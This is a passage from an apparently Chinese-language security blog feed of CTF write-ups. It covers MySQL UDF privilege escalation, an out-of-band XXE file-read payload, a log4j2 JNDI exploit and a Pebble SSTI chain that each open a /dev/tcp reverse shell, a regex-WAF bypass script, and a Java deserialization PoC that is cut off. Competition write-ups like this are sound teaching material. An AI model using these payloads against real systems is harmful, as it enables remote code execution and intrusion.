string">"/var/www/html/query.php"</span> <span class="token keyword">into</span> <span class="token keyword">table</span> TestTable</code></pre><p>然后得到 <code>query.php</code> 源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// mine</span><span class="token comment">// $db_host = '127.0.0.1';</span><span class="token comment">// $db_username = 'root';</span><span class="token comment">// $db_password = '1q2w3e4r5t!@#';</span><span class="token comment">// $db_name = 'mysql';</span><span class="token variable">$db_host</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"db_host"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$db_username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"db_username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$db_password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"db_password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$db_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"db_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$db_host</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$dsn</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"mysql:host=<span class="token interpolation"><span class="token variable">$db_host</span></span>;dbname=<span class="token interpolation"><span class="token variable">$db_name</span></span>"</span><span class="token punctuation">;</span>        <span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token variable">$dsn</span><span class="token punctuation">,</span> <span class="token variable">$db_username</span><span class="token punctuation">,</span> <span class="token variable">$db_password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$pdo</span><span class="token operator">-></span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_ERRMODE</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ERRMODE_EXCEPTION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dsn'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$dsn</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'db_username'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$db_username</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'db_password'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$db_password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dsn'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script>alert('请先连接数据库);window.location.href='index.php'&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>使用靶机连接注释中的本地 mysql 服务端</p><h3 id="2-plugin-udf-提权"><a href="#2-plugin-udf-提权" class="headerlink" title="2. plugin udf 提权"></a>2. plugin udf 提权</h3><p>运行 sql 语句</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'%plugin%'</span><span class="token punctuation">;</span></code></pre><p>发现 plugin 目录被改了：</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">/</span>var<span class="token operator">/</span>lib<span class="token operator">/</span>mysql<span class="token operator">/</span>p1ugin</code></pre><p>mysql plugin udf 提权</p><p><a href="https://www.sqlsec.com/udf/">https://www.sqlsec.com/udf/</a></p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> unhex<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">into</span> <span class="token keyword">dumpfile</span> <span class="token string">'/usr/lib/mysql/p1ugin/lin1.so'</span><span class="token punctuation">;</span></code></pre><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">function</span> sys_eval <span class="token keyword">returns</span> string <span class="token keyword">soname</span> <span class="token string">'lin1.so'</span><span class="token punctuation">;</span></code></pre><p>然后 RCE </p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">'cat /proc/self/environ'</span><span class="token punctuation">;</span><span class="token punctuation">)</span></code></pre><p>然后就有 flag 了（</p>]]></content>
      
      
      <categories>
          
          <category> Write Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NodeJS </tag>
            
            <tag> SQL </tag>
            
            <tag> Linux </tag>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XML CDATA XXE</title>
      <link href="/skill/xml-cdata-xxe/"/>
      <url>/skill/xml-cdata-xxe/</url>
      
        <content type="html"><![CDATA[<p>在正常使用xxe任意读取文件时，<br>如果被读取的文件中有特殊符号，XML解析时会产生错误，<br>此时需要用CDATA，CDATA区段中的文本会被解析器忽略。<br>另外，任何特殊字符在XML中都要被替换为实体引用。<br>CDATA的格式是引用的两边加上 <code>&lt;![CDATA[</code> 和 <code>]]&gt;</code>，<br>但是内部参数的实体引用是被禁止的，</p><p>Document: <a href="https://www.w3.org/TR/xml/">https://www.w3.org/TR/xml/</a></p><blockquote><p>Well-formedness constraint: PEs in Internal Subset<br>In the internal DTD subset, parameter-entity references must not occur within markup declarations; they may occur where markup declarations can occur. (This does not apply to references that occur in external parameter entities or to the external subset.)</p></blockquote><p>所以我们都要写成各个实体的形式，<br>最终拼接到一起就需要用到外部参数实体</p><pre class="language-markup" data-language="markup"><code class="language-markup">//payload.xml<span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">spirit</span> <span class="token punctuation">[</span><span class="token internal-subset">        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">start</span> <span class="token attr-name">"&lt;![CDATA["</span><span class="token punctuation">></span></span>        &lt;!ENTITY % file SYSTEM "file:///flag">        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">end</span> <span class="token attr-name">"]]</span><span class="token punctuation">></span></span>">        &lt;!ENTITY % dtd SYSTEM "http://<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>server_ip</span><span class="token punctuation">></span></span>:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>port</span><span class="token punctuation">></span></span>/concat.dtd"> %dtd; </span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>spirit</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&all;">&amp;all;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>spirit</span><span class="token punctuation">></span></span></code></pre><pre class="language-markup" data-language="markup"><code class="language-markup">//concat.dtd<span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">all</span> <span class="token attr-name">"%start;%file;%end;"</span><span class="token punctuation">></span></span></code></pre><p>将 <code>concat.dtd</code> 部署到远程服务器上并在靶机上使用 <code>payload.xml</code> 即可</p>]]></content>
      
      
      <categories>
          
          <category> Skill </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 NCTF WriteUp</title>
      <link href="/write-up/2023-nctf-writeup/"/>
      <url>/write-up/2023-nctf-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="logging"><a href="#logging" class="headerlink" title="logging"></a>logging</h1><p><code>log4j2 rce (CVE-2021-44228)</code></p><p>使用工具：</p><p><a href="https://github.com/welk1n/JNDI-Injection-Exploit">welk1n&#x2F;JNDI-Injection-Exploit: JNDI注入测试工具（A tool which generates JNDI links can start several servers to exploit JNDI Injection vulnerability,like Jackson,Fastjson,etc） (github.com)</a></p><p>Server Bash run：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar <span class="token parameter variable">-C</span> <span class="token string">"bash -c &#123;echo,x&#125;(x: 'bash -i >&amp; /dev/tcp/ip/port 0>&amp;1' encoded with base64)|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span> <span class="token parameter variable">-A</span> <span class="token operator">&lt;</span>server_ip<span class="token operator">></span>:<span class="token operator">&lt;</span>listen_port<span class="token operator">></span></code></pre><p>在 Request 的 Accept Header 中注入 jndi，触发报错日志记录，</p><pre class="language-markup" data-language="markup"><code class="language-markup">$&#123;jndi:rmi://<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>server_ip</span><span class="token punctuation">></span></span>:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rmi_port</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ramdom_rmi_route</span><span class="token punctuation">></span></span>&#125;</code></pre><p>log4j2 远程加载 Class 类 反弹 Shell</p><h1 id="Wait-What"><a href="#Wait-What" class="headerlink" title="Wait What"></a>Wait What</h1><blockquote><p>写战队wp的时候写了个这题的抽象版wp，结果发现认错出题人了还被拿来当官方wp了，给 X1r0z 和 114 佬们跪了Orz，以下是正常版wp</p></blockquote><p>由于 admin 账号被放入了 waf 中<br>而我们又需要登录 admin 账号来获取 flag<br>因此本题的核心目标是绕过两道 waf 来登录 admin 账号获取 flag</p><h2 id="1-正则-waf-绕过"><a href="#1-正则-waf-绕过" class="headerlink" title="1. 正则 waf 绕过"></a>1. 正则 waf 绕过</h2><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> test1 <span class="token operator">=</span> banned_users_regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">使用正则</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>banned_users_regex<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">匹配</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>username<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">的结果为：</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>test1<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span>test1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"第一个判断匹配到封禁用户："</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"用户'"</span><span class="token operator">+</span>username <span class="token operator">+</span> <span class="token string">"'被封禁，无法鉴权！"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span><span class="token punctuation">&#125;</span></code></pre><p>由于 <code>new RegExp(regex_string, &quot;g&quot;)</code> 定义了 g 的全局 regex</p><blockquote><p>regex.test()：<br>如果正则表达式设置了全局标志，<code>test()</code> 的执行会改变正则表达式 <code>lastIndex</code>属性。<br>连续的执行<code>test()</code>方法，后续的执行将会从 lastIndex 处开始匹配字符串<br>example：</p></blockquote><pre class="language-javascript" data-language="javascript"><code class="language-javascript">ar regex <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">foo</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">;</span><span class="token comment">// regex.lastIndex is at 0 </span>regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"foo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true </span><span class="token comment">// regex.lastIndex is now at 3 </span>regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"foo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false</span></code></pre><p>此处存在漏洞利用的可能，但在 <code>app.use()</code> 中:</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token function">build_banned_users_regex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"封禁用户正则表达式（满足这个正则表达式的用户名为被封禁用户名）："</span><span class="token punctuation">,</span>banned_users_regex<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><p><code>build_banned_users_regex()</code>：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">build_banned_users_regex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> regex_string <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> username <span class="token keyword">of</span> banned_users<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        regex_string <span class="token operator">+=</span> <span class="token string">"^"</span> <span class="token operator">+</span> <span class="token function">escapeRegExp</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"$"</span> <span class="token operator">+</span> <span class="token string">"|"</span>    <span class="token punctuation">&#125;</span>    regex_string <span class="token operator">=</span> regex_string<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> regex_string<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>    banned_users_regex <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span>regex_string<span class="token punctuation">,</span> <span class="token string">"g"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><p><code>escapeRegExp(username)</code>：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">escapeRegExp</span><span class="token punctuation">(</span><span class="token parameter">string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> string<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[.*+?^$&#123;&#125;()|[\]\\]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'\\$&amp;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>这些代码会导致每次在请求时都会更新 banned_users_regex ，恢复其 lastIndex 位置<br>由于 try 和 catch 的存在，我们考虑 throw error 来绕过 regex 的更新</p><p>通过构造传入 <code>escapeRegExp()</code>函数中的 string 为其他数据类型，</p><p>可以使得 replace 属性报错，这样就可以绕过 regex 的更新</p><h2 id="2-in-关键字-waf-绕过"><a href="#2-in-关键字-waf-绕过" class="headerlink" title="2. in 关键字 waf 绕过"></a>2. in 关键字 waf 绕过</h2><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> test2 <span class="token operator">=</span> <span class="token punctuation">(</span>username <span class="token keyword">in</span> banned_users<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">使用in关键字匹配</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>username<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">的结果为：</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>test2<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span>test2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"第二个判断匹配到封禁用户："</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"用户'"</span><span class="token operator">+</span>username <span class="token operator">+</span> <span class="token string">"'被封禁，无法鉴权！"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span><span class="token punctuation">&#125;</span></code></pre><blockquote><p>JavaScript：in：如果指定的属性在指定的对象或其原型链中，则 <code>in</code> 运算符返回 <code>true</code></p></blockquote><p>由于 banned_users 为 <code>Array</code> 类型，不存在 admin 属性，<br>因此 test2 恒为 <code>false</code>，与 banned_users 的具体元素内容无关</p><h2 id="3-解题步骤"><a href="#3-解题步骤" class="headerlink" title="3. 解题步骤"></a>3. 解题步骤</h2><ol><li>利用 &#x2F;api&#x2F;ban_user 路由构造 ban_username 为 {} 等其他数据类型</li><li>执行 &#x2F;api&#x2F;flag ，使得 regex 的 lastIndex 移至 admin 以后</li><li>执行 &#x2F;api&#x2F;flag，成功绕过正则 waf，正则 waf 返回 false，获得 flag</li></ol><h2 id="4-Poc"><a href="#4-Poc" class="headerlink" title="4. Poc"></a>4. Poc</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsBase_url <span class="token operator">=</span> <span class="token string">"&lt;challenge_url>:&lt;port>"</span><span class="token comment"># bypass regex regeneratation (throw error)</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>    <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>Base_url<span class="token punctuation">&#125;</span></span><span class="token string">/api/ban_user'</span></span><span class="token punctuation">,</span>     json<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'user'</span><span class="token punctuation">,</span>        <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'user'</span><span class="token punctuation">,</span>        <span class="token string">'ban_username'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[1/2] Successfully Bypassed Regex Regeneratation"</span><span class="token punctuation">)</span><span class="token comment"># using .test() twice and bypass regex</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>        <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>Base_url<span class="token punctuation">&#125;</span></span><span class="token string">/api/flag'</span></span><span class="token punctuation">,</span>         json<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'admin'</span><span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'admin'</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[2/2] Done! flag: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>response<span class="token punctuation">.</span>text<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Write Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NodeJS </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 强网杯S7 WriteUp</title>
      <link href="/write-up/2023-%E5%BC%BA%E7%BD%91%E6%9D%AFs7-writeup/"/>
      <url>/write-up/2023-%E5%BC%BA%E7%BD%91%E6%9D%AFs7-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="hello-spring"><a href="#hello-spring" class="headerlink" title="hello spring"></a>hello spring</h1><h2 id="1-解题思路"><a href="#1-解题思路" class="headerlink" title="1. 解题思路"></a>1. 解题思路</h2><ul><li>CVE-2022-37767：Pebble 3.1.5 RCE</li><li>屏蔽了关键词，使用字符串拼接绕过：org.springframework.context.support.ClassPathXmlApplicationContext</li></ul><h2 id="2-Poc"><a href="#2-Poc" class="headerlink" title="2. Poc"></a>2. Poc</h2><p>1.pebble</p><pre class="language-none"><code class="language-none">&#123;% set y &#x3D; beans.get(&quot;org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory&quot;).resourceLoader.classLoader.loadClass(&quot;java.beans.Beans&quot;) %&#125;&#123;% set yy &#x3D; beans.get(&quot;jacksonObjectMapper&quot;).readValue(&quot;&#123;&#125;&quot;, y) %&#125;&#123;% set a &#x3D; &quot;org.springframework.context.support.&quot; %&#125;&#123;% set b &#x3D; &quot;ClassPathXmlApplicationContext&quot; %&#125;&#123;% set yyy &#x3D; yy.instantiate(null,a+b) %&#125;&#123;&#123; yyy.setConfigLocation(&quot;1.xml&quot;) &#125;&#125;&#123;&#123; yyy.refresh() &#125;&#125;</code></pre><p>1.xml</p><pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;    &lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot;       xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;       xsi:schemaLocation&#x3D;&quot;     http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans.xsd&quot;&gt;        &lt;bean id&#x3D;&quot;pb&quot; class&#x3D;&quot;java.lang.ProcessBuilder&quot; init-method&#x3D;&quot;start&quot;&gt;            &lt;constructor-arg &gt;            &lt;list&gt;                &lt;value&gt;bash&lt;&#x2F;value&gt;                &lt;value&gt;-c&lt;&#x2F;value&gt;                &lt;value&gt;echo x|base64 -d|bash -i&lt;&#x2F;value&gt;                 &lt;!-- x: &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&quot; encoded with base64 --&gt;            &lt;&#x2F;list&gt;            &lt;&#x2F;constructor-arg&gt;        &lt;&#x2F;bean&gt;    &lt;&#x2F;beans&gt;</code></pre><p>反弹 shell 获得 flag</p><h1 id="happygame"><a href="#happygame" class="headerlink" title="happygame"></a>happygame</h1><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><ol><li>grpcui 连接 gRPC</li><li>java cc6 unserialize 反弹 shell</li></ol><h2 id="1-连接-gRPC"><a href="#1-连接-gRPC" class="headerlink" title="1. 连接 gRPC"></a>1. 连接 gRPC</h2><p>靶机给出了一个 nc ip 和 port<br>但是直接使用 netcat 连接无法进行正常交互<br>经过简单的搜索后发现目标是一个 gRPC</p><p>常见连接方式有 <a href="https://github.com/fullstorydev/grpcui">grpcui</a> 和 <a href="https://github.com/fullstorydev/grpcurl">grpcurl</a> 两种</p><p>此处使用 <a href="https://github.com/fullstorydev/grpcui">grpcui</a> 来连接，因为其具有 ui 界面且操作方便</p><p>连接后发现存在 serialize 函数入口点可以被利用</p><h2 id="2-java-cc6-unserialize-poc"><a href="#2-java-cc6-unserialize-poc" class="headerlink" title="2. java cc6 unserialize poc"></a>2. java cc6 unserialize poc</h2><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">App</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span 